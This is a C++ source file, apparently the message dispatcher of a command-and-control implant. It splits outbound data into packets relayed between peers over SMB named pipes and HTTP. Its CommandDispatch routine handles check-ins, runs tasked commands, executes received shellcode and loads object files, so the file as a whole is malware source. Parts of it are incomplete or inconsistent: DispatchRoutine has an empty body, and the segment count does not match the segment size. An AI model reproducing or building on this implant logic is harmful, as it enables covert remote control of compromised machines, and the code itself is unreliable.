#include <core/include/dispatch.hpp>

using namespace Utils;
using namespace Peers;
using namespace Stream;
using namespace Parser;
using namespace Network::Smb;
using namespace Network::Http;
using namespace Memory::Execute;
using namespace Dispatcher;

namespace Dispatcher {
    VOID AddMessage(PACKET *packet) {
        auto head = Ctx->MessageCache;

        if (!Ctx->MessageCache) {
            Ctx->MessageCache = packet;
        } else {
            while (head->Next) {
                head = head->Next;
            }
            head->Next = packet;
        }
    }

    VOID RemoveMessage(PACKET *target) {
        PACKET *prev = { };

        if (!Ctx->MessageCache || !target) {
            return;
        }
        for (auto head = Ctx->MessageCache; head; head = head->Next) {
            if (head == target) {
                if (prev) {
                    prev->Next = head->Next;
                } else {
                    Ctx->MessageCache = head->Next;
                }

                DestroyPacket(head);
                return;

            }
            prev = head;
        }
    }

	// NOTE: I feel like the architecture should just be "label inbound/outbound" then simply check all messages.
	// Named pipes are FIFO anyway, so, why not just check? Unless they're blocking, which in that case, we wouldn't need flags.
    VOID QueueSegments(UINT8* buffer, UINT32 length) {
        PACKET *queue = { };

        UINT32 offset = 0;
        UINT32 peerId = 0;
        UINT32 taskId = 0;
        UINT32 cbSeg  = 0;
        UINT32 index  = 1;

        const auto nSeg 	= (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
        constexpr auto mMax = MESSAGE_MAX - SEGMENT_HEADER_SIZE;

        while (length > 0) {
            cbSeg = length > mMax ? mMax : length;
            queue = (PACKET*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE);

            MemCopy(&peerId, buffer, sizeof(peerId));
            MemCopy(&taskId, buffer + 4, sizeof(taskId));

            queue->PeerId = peerId;
            queue->TaskId = taskId;
            queue->MsgType = TypeSegment;

            PackUint32(queue, index);
            PackUint32(queue, nSeg);
            PackUint32(queue, cbSeg);
            PackBytes(queue, (PBYTE)buffer + offset, cbSeg);

            length -= cbSeg;
            offset += cbSeg;
            index++;

            AddMessage(queue);
        }
    }

    BOOL DispatchRoutine() {
    }

    VOID CommandDispatch (PACKET* inPack) {
        PARSER parser = { };

        CreateParser(&parser, (PBYTE)inPack->MsgData, inPack->MsgLength);
        UnpackUint32(&parser);

        auto taskId = UnpackUint32(&parser);
        MemCopy(&Ctx->Session.CurrentTaskId, &taskId, sizeof(UINT32));

        switch (UnpackUint32(&parser)) {
		case TypeCheckin:
			MemSet(&Ctx->Session.CheckIn, true, sizeof(BOOL));
			break;
		case TypeTasking:
			ExecuteCommand(parser);
			break;
		case TypeExecute:
			ExecuteShellcode(parser);
			break;
		case TypeObject:
			LoadObject(parser);
			break;

		default:
			break;
        }

        DestroyParser(&parser);
    }
}
